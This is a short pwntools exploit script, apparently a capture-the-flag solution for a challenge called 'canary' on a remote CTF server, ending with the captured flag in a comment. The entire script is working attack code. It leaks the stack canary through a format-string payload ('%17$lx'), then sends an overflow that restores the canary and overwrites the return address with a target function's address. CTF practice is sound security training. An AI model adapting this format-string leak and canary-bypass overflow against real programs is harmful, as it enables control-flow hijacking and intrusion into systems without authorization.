from pwn import *

#p = process("./canary")
p = remote("shell.actf.co",20701)

flag = 0x400787
payload = "%17$lx  "

p.sendlineafter("name?",payload)
p.recvuntil("you, ")
canary = int(p.recv(16),16)

log.info(hex(canary))

payload2 = "a"*0x38+p64(canary)+"b"*8+p64(flag)
pause()
p.sendlineafter("me? ",payload2)


p.interactive()
#actf{youre_a_canary_killer_>:(}